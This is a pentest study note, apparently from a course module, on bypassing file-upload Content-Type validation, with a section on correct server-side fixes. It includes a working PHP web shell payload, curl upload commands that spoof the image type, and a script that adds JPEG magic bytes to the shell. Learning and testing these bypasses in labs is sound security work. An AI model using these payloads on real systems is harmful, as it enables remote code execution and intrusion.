---
tags: [vapt, file-upload, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.03 Content-Type Bypass"
portswigger_labs: ["Web shell upload via Content-Type restriction bypass"]
---

# 22.03 — Content-Type Bypass

## How Content-Type Validation Works

```
CONTENT-TYPE HEADER IN UPLOAD:
  Multipart upload request includes Content-Type for each part:
  
  POST /upload HTTP/1.1
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg    ← THE HEADER THAT VALIDATES
  
  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--

VULNERABLE SERVER-SIDE CHECK:
  $content_type = $_FILES['file']['type'];  // From request header!
  if ($content_type != 'image/jpeg' && $content_type != 'image/png'):
      die("Only images allowed!")
  
  PROBLEM: $_FILES['file']['type'] is set from the CLIENT-SUPPLIED header!
  → Browser (or Burp) can set any Content-Type!
  → Change Content-Type: application/php → image/jpeg → bypass!
```

---

## The Bypass

```
ORIGINAL REQUEST (browser sends):
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: application/x-php
  
  <?php system($_GET['cmd']); ?>

MODIFIED REQUEST (in Burp → forward):
  Content-Disposition: form-data; name="file"; filename="shell.php"
  Content-Type: image/jpeg    ← CHANGED!
  
  <?php system($_GET['cmd']); ?>

SERVER CHECKS: Content-Type == image/jpeg → YES → ALLOWED!
But: File content is still PHP!
Server saves as shell.php → PHP executed when visited!

COMMON CONTENT-TYPE VALUES TO USE:
  image/jpeg
  image/png
  image/gif
  image/webp
  image/bmp
  text/plain (if text allowed)
```

---

## Testing Content-Type Bypass

```bash
# STEP 1: INTERCEPT UPLOAD IN BURP

# STEP 2: ORIGINAL REQUEST LOOKS LIKE:
# Content-Disposition: form-data; name="file"; filename="shell.php"
# Content-Type: application/x-php

# STEP 3: MODIFY IN BURP REPEATER:
# Change the Content-Type part (within multipart body):
# Content-Type: image/jpeg

# KEEPING FILENAME AS shell.php!

# STEP 4: FORWARD → CHECK RESPONSE

# MANUAL CURL TEST:
curl -X POST https://target.com/upload \
  -b "session=YOUR_SESSION" \
  -F "file=@shell.php;type=image/jpeg"  # ← override Content-Type!
# The ";type=image/jpeg" in -F changes the Content-Type sent!

# ALTERNATIVE CURL:
# Create fake JPEG with PHP content:
python3 -c "
import sys
# Write PHP webshell:
content = b'<?php system(\$_GET[\"cmd\"]); ?>'
# But with JPEG magic bytes at start:
# (Some checks look at file content, not just Content-Type)
magic = b'\xff\xd8\xff\xe0'  # JPEG magic bytes
sys.stdout.buffer.write(magic + content)
" > shell_with_magic.php

curl -X POST https://target.com/upload \
  -b "session=YOUR_SESSION" \
  -F "file=@shell_with_magic.php;type=image/jpeg"
```

---

## Double-Checking: What Does Server Validate?

```
DIFFERENT VALIDATION LEVELS:

LEVEL 1 (WEAKEST): Trust client Content-Type header
  → Bypass: just change Content-Type to image/jpeg
  
LEVEL 2: Check file extension
  → Bypass: see note 04 (extension bypasses)
  
LEVEL 3: Check file magic bytes (first bytes of file)
  → Bypass: see note 12 (magic bytes bypass)
  
LEVEL 4 (CORRECT): Validate content through proper image library
  → E.g., use Python Pillow: Image.open(file_data)
  → If it throws → not a real image!
  → If it succeeds AND resize/save as PNG → safe!

TEST WHICH LEVEL:
  Test 1: Upload .php with Content-Type: image/jpeg → SUCCESS? → Level 1 only!
  Test 2: Upload .php.jpg with PHP content → SUCCESS? → Level 1-2 only
  Test 3: Add JPEG magic bytes to PHP file → SUCCESS? → Level 1-3 only
```

---

## Chaining with Extension Bypass

```
COMBINE CONTENT-TYPE + EXTENSION:

If server checks: Content-Type must be image/* AND extension must be .jpg:
  Upload: shell.php.jpg (extension .jpg = OK)
  With:   Content-Type: image/jpeg (content-type = OK)
  Content: <?php system($_GET['cmd']); ?>
  
  IF: server saves as .php.jpg and Apache is configured to execute .php.jpg as PHP:
  → Still RCE!
  
  IF: server saves as .jpg but executes PHP (AddHandler misconfiguration):
  → RCE!
  
  (Cover more extension details in note 05)
```

---

## Fix

```
CORRECT CONTENT-TYPE VALIDATION:

NEVER TRUST CLIENT-SUPPLIED Content-Type:
  # BAD (PHP):
  $type = $_FILES['file']['type'];  # from request!
  if ($type == 'image/jpeg') { ... }
  
  # BETTER: Use finfo to check actual file content:
  $finfo = new finfo(FILEINFO_MIME_TYPE);
  $detected_type = $finfo->file($_FILES['file']['tmp_name']);
  if (!in_array($detected_type, ['image/jpeg', 'image/png', 'image/gif'])) {
      die("Invalid file type");
  }
  
  # BEST: Parse as image using a library:
  try {
      $image = new Imagick($_FILES['file']['tmp_name']);
      // If no exception → valid image!
      // Re-save to strip metadata and any embedded code:
      $image->writeImage($upload_path . '/' . $safe_filename . '.jpg');
  } catch (Exception $e) {
      die("Invalid image");
  }

  # Python:
  from PIL import Image
  try:
      img = Image.open(file_data)
      img.verify()  # Check it's really an image
      # Re-save:
      img = Image.open(file_data)  # Reopen after verify
      img.save(upload_path, 'JPEG')  # Safe re-save
  except Exception:
      raise ValueError("Not a valid image")
```

---

## Related Notes
- [[01 - What Makes File Upload Dangerous]] — why this matters
- [[02 - Unrestricted File Upload — Webshell Upload]] — webshell upload
- [[04 - Extension Bypass (.php5, .phtml, .phar, .shtml)]] — extension bypasses
- [[12 - Image Upload Magic Bytes Bypass]] — magic bytes bypass
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]] — full fix
